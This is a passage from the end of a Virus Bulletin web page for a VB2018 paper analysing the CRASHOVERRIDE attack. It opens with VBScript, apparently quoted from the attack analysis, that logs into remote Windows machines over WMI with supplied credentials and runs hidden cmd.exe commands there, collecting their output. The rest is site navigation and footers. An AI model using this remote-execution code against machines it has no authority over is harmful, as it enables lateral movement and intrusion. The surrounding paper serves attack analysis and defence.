<p class="monospace" style="padding-left: 30px;">Dim objSWbemLocator<br />Dim objSWbemServices</p>
<p class="monospace" style="padding-left: 30px;">&lt;BREAK&gt;</p>
<p class="monospace" style="padding-left: 30px;">Function RunRemoteProcess(Command)<br />        Set objStartup = objSWbemServices.Get("Win32_ProcessStartup")<br />        Set objConfig = objStartup.SpawnInstance_<br />        objConfig.ShowWindow = 0<br />   Set objProcess = objSWbemServices.Get("Win32_Process")<br />        strCmd = "cmd.exe /c " &amp; Command &amp; " &gt;&gt; " &amp; GetReportFile()<br />   intReturn = objProcess.Create(strCmd, Null, objConfig, intProcessID)<br />        If intReturn &lt;&gt; 0 Then<br />   Wscript.Echo "Process could not be created." &amp; _<br />        vbNewLine &amp; "Command line: " &amp; strCmd &amp; _<br />        vbNewLine &amp; "Return value: " &amp; intReturn<br />            RunRemoteProcess = 2<br />            Exit Function<br />        End If<br />        Set WaitProcesses = objSWbemServices.ExecNotificationQuery("Select * From __InstanceDeletionEvent Within 1 Where TargetInstance ISA 'Win32_Process'")<br />        Do Until i = 1<br />            Set objLatestProcess = WaitProcesses.NextEvent<br />            If objLatestProcess.TargetInstance.ProcessID = intProcessID Then<br />                i = 1<br />            End If<br />        Loop<br />        RunRemoteProcess = 0<br />End Function</p>
<p class="monospace" style="padding-left: 30px;">&lt;BREAK&gt; </p>
<p class="monospace" style="padding-left: 30px;">Function ConnectToServer(RemoteMachine, Username, Password)<br />        Set objSWbemLocator = CreateObject("WbemScripting.SWbemLocator")<br />   Set objSWbemServices = objSWbemLocator.ConnectServer(RemoteMachine, "root\CIMV2", Username, Password)<br />   If Err.Number &lt;&gt; 0 Then<br />        Wscript.StdOut.Write "Error: " &amp; Err.Description<br />            ConnectToServer = 1<br />            Exit Function<br />   End If<br />        ConnectToServer = 0<br />        Set colItems = objSWbemServices.ExecQuery("Select * From Win32_OperatingSystem")<br />        For Each objItem in colItems<br />            Header = vbNullString<br />            Header = Header &amp; objItem.Caption &amp; objItem.CSDVersion &amp; vbCrLF<br />            Header = Header &amp; "CodeSet: " &amp; objItem.CodeSet &amp; vbCrLF<br />   Next<br />   Wscript.StdOut.Write Header<br />End Function</p> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<p><a href="/uploads/pdf/magazine/2018/VB2018-Slowik.pdf" target="_blank"><img src="/uploads/images/buttons/pdf-download-button.jpg" alt="Download PDF" width="262" height="45" /></a></p>
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=VB2018 paper: Anatomy of an attack: detecting and defeating CRASHOVERRIDE&url=https://www.virusbulletin.com/virusbulletin/2019/03/vb2018-paper-anatomy-attack-detecting-and-defeating-crashoverride"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2019/03/vb2018-paper-anatomy-attack-detecting-and-defeating-crashoverride'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2019/03/vb2018-paper-anatomy-attack-detecting-and-defeating-crashoverride&title=VB2018 paper: Anatomy of an attack: detecting and defeating CRASHOVERRIDE"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2019/03/vb2018-paper-anatomy-attack-detecting-and-defeating-crashoverride&t=VB2018 paper: Anatomy of an attack: detecting and defeating CRASHOVERRIDE"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2019/03/vb2018-paper-anatomy-attack-detecting-and-defeating-crashoverride"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">

<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">©1989-2022 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>